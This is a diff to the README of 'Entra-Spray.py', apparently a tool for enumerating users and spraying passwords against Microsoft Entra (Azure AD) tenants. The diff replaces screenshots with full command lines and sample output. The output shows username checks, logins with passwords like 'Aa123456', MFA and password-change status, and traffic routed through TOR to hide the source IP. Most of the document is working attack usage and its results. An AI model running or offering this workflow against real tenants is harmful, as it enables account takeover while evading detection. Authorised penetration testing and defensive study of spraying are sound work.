@@ -40,53 +40,102 @@ Checking If User Exist:
 ```python
 python3 Entra-Spray.py -user list-of-usernames.txt -check
 
-[✗] Username: shoshi@mytenant.onmicrosoft.com is exists
-[✗] Username: david@mytenant.onmicrosoft.com is exists
-[✗] Username: normuser@mytenant.onmicrosoft.com is exists
-[✗] Username: shakedwiessman@mytenant.onmicrosoft.com is exists
+[✓] Username: shoshi@entraspraytenant.onmicrosoft.com is exists
+[✓] Username: david@entraspraytenant.onmicrosoft.comis exists
+[✗] Username: dan@entraspraytenant.onmicrosoft.com not exists
+[✓] Username: normuser@entraspraytenant.onmicrosoft.com is exists
+[✓] Username: shakedwiessman@entraspraytenant.onmicrosoft.com is exists
 
 
 ----------------------------
  Valid users and successful authentications written to valid-users.txt
 ```
-<img width="1374" height="164" alt="image" src="https://github.com/user-attachments/assets/54f20eec-2899-429d-9e6b-12c3f5703744" />
 
 Checking If User Exist with TOR routing (-proxytor flag):
 ```python
 python3 Entra-Spray.py -user list-of-usernames.txt -check -proxytor
+
+[i] Current TOR IP: {"IsTor":true,"IP":"109.228.160.190"}
+[✓] Username: shoshi@entraspraytenant.onmicrosoft.com is exists
+[✓] Username: david@entraspraytenant.onmicrosoft.com is exists
+[✗] Username: dan@mentraspraytenant.onmicrosoft.com not exists
+[✓] Username: normuser@entraspraytenant.onmicrosoft.com is exists
+[✓] Username: shakedwiessman@entraspraytenant.onmicrosoft.com is exists
+
+----------------------------
+ Valid users and successful authentications written to valid-users.txt
 ```
-<img width="1165" height="171" alt="image" src="https://github.com/user-attachments/assets/eb224b87-ab49-4b8f-9f84-0d3d11ab211c" />
 
 Preforming Password Spray Attack:
 ```python
-python3 Entra-Spray.py -user list-of-usernames.txt -password 'Aa123456' 
+python3 Entra-Spray.py -user list-of-usernames.txt -password 'Aa123456'
+
+[-] Failed to authenticate with shoshi@entraspraytenant.onmicrosoft.com with password Aa123456, didn't check if user exists
+[✓] User david@entraspraytenant.onmicrosoft.com is exist, and seccessfully logged in with password: Aa123456, MFA required but not configured
+[-] Failed to authenticate with normuser@entraspraytenant.onmicrosoft.com with password Aa123456, didn't check if user exists
+[-] Failed to authenticate with shakedwiessman@entraspraytenant.onmicrosoft.com with password Aa123456, didn't check if user exists
+
+----------------------------
+ Valid users and successful authentications written to valid-users.txt
 ```
-<img width="1323" height="155" alt="image" src="https://github.com/user-attachments/assets/b507524c-e681-4a31-bd63-366dad4f8e4e" />
 
 Preforming Password Spray Attack with '-check' flag:
 ```python
 python3 Entra-Spray.py -user list-of-usernames.txt -password 'Aa123456' -check
-```
-<img width="1348" height="146" alt="image" src="https://github.com/user-attachments/assets/d4c33afb-92b5-47d6-ba85-62f5c84f5c8b" />
 
+[!] NOT-success: shoshi@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Aa123456
+[✓] User david@entraspraytenant.onmicrosoft.com is exist, and seccessfully logged in with password: Aa123456, MFA required but not configured
+[!] NOT-success: normuser@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Aa123456
+[!] NOT-success: shakedwiessman@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Aa123456
+
+----------------------------
+ Valid users and successful authentications written to valid-users.txt
+```
 
 Preforming Password Spray Attack with '-check' flag and with TOR routing:
-
 The script will check if:
 - The user is required to have MFA but has not yet set it up
 - The user is required to have MFA
 - The user is required to change their password
-- 
+  
 ```python
 python3 Entra-Spray.py -user list-of-usernames.txt -password 'Aa123456' -check -proxytor
+
+[i] Current TOR IP: {"IsTor":true,"IP":"109.228.160.190"}
+[!] NOT-success: shoshi@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Aa123456
+[✓] User david@entraspraytenant.onmicrosoft.com is exist, and seccessfully logged in with password: Aa123456, MFA required but not configured
+[!] NOT-success: normuser@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Aa123456
+[!] NOT-success: shakedwiessman@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Aa123456
+
+----------------------------
+ Valid users and successful authentications written to valid-users.txt
 ```
-<img width="1397" height="158" alt="image" src="https://github.com/user-attachments/assets/09b80662-a916-4701-8a37-acad264e5425" />
 
-<img width="1404" height="164" alt="image" src="https://github.com/user-attachments/assets/630588b2-bba4-498d-8e02-833f8ad6d3f7" />
+```python
+python3 Entra-Spray.py -user list-of-usernames.txt -password 'Bb123456' -check -proxytor
 
-<img width="1374" height="164" alt="image" src="https://github.com/user-attachments/assets/681ab882-dbbe-41d0-8944-248fe43ac764" />
+[i] Current TOR IP: {"IsTor":true,"IP":"110.22.66.190"}
+[!] NOT-success: shoshi@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Bb123456
+[!] NOT-success: david@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Bb123456
+[!] NOT-success: normuser@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Bb123456
+[✓] User shakedwiessman@entraspraytenant.onmicrosoft.com is exist, and seccessfully logged in with password: Bb123456, MFA required
 
+----------------------------
+ Valid users and successful authentications written to valid-users.txt
+```
 
+```python
+python3 Entra-Spray.py -user list-of-usernames.txt -password 'Cc123456' -check -proxytor
+
+[i] Current TOR IP: {"IsTor":true,"IP":"109.172.188.113"}
+[✓] User shoshi@entraspraytenant.onmicrosoft.com is exist, and Password needs updating: Cc123456
+[!] NOT-success: david@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Cc123456
+[!] NOT-success: normuser@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Cc123456
+[!] NOT-success: shakedwiessman@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Cc123456
+
+----------------------------
+ Valid users and successful authentications written to valid-users.txt
+```
 ## Usage with TOR:
 
 ### Install:
